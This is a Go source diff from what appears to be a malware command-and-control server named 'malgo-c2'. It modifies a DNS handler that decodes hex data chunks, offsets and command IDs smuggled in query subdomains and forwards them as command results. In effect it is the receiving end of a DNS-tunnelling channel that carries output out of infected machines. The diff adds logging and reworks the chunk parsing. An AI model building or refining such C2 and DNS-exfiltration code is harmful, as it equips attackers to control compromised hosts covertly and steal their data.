@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/hex"
 	"fmt"
+	"github.com/VipWW/malgo-c2/services/common/log"
 	"net"
 	"strconv"
 	"strings"
@@ -20,46 +21,53 @@ import (
 // length and offset are in HEX. Chunk is in HEX. TODO: change to Base58
 func (h *Handler) handleA(msg *dns.Msg, r *dns.Msg) error {
 	dataFromMessage := h.removeDomain(r.Question[0].Name)
+	log.FromContext(context.Background()).Infof("Data from message: %s", dataFromMessage)
 	if dataFromMessage == "" {
 		return fmt.Errorf("invalid domain")
 	}
 
 	splitData := strings.Split(dataFromMessage, ".")
+	// skip the first character
+	splitData = splitData[1:]
+	dataLength := len(splitData)
 
-	switch len(splitData) {
-	case 3:
-		// <result length>.<CommandID>.<domain>
-		length, err := strconv.Atoi(splitData[1])
+	if dataLength < 2 {
+		return fmt.Errorf("invalid data")
+	} else if dataLength == 2 {
+		// <nothing>.<result length>.<CommandID>
+		log.FromContext(context.Background()).Infof("Setting result length to %s", splitData[0])
+		length, err := strconv.Atoi(splitData[0])
 		if err != nil {
 			return err
 		}
 		_, err = h.grpcClient.ResultInfo(context.Background(), &gateway.ResultInfoRequest{
-			CommandId: splitData[2],
+			CommandId: splitData[1],
 			Length:    int64(length),
 		})
 		if err != nil {
 			return err
 		}
-	case 4:
-		// <data chunk>.<offset>.<CommandID>.<domain>
-		data, err := hex.DecodeString(splitData[1])
+	} else {
+		// <data chunkS with multiple dots>.<offset>.<CommandID>
+		data, err := hex.DecodeString(strings.Join(splitData[:dataLength-2], ""))
 		if err != nil {
 			return err
 		}
-		offset, err := strconv.ParseInt(splitData[2], 16, 64)
+		log.FromContext(context.Background()).Infof("Data chunk: %s", string(data))
+		offset, err := strconv.ParseInt(splitData[dataLength-2], 10, 64)
 		if err != nil {
 			return err
 		}
+		log.FromContext(context.Background()).Infof("Adding result chunk %v", offset)
 		_, err = h.grpcClient.ResultDetailsChunk(context.Background(), &gateway.ResultDetailsChunkRequest{
-			CommandId: splitData[3],
+			CommandId: splitData[dataLength-1],
 			Offset:    offset,
 			Data:      data,
 		})
 		if err != nil {
 			return err
 		}
-	default:
-		return fmt.Errorf("invalid data")
+		log.FromContext(context.Background()).Infof("Added result chunk %v", offset)
 	}
 
 	msg.Answer = append(msg.Answer, &dns.A{
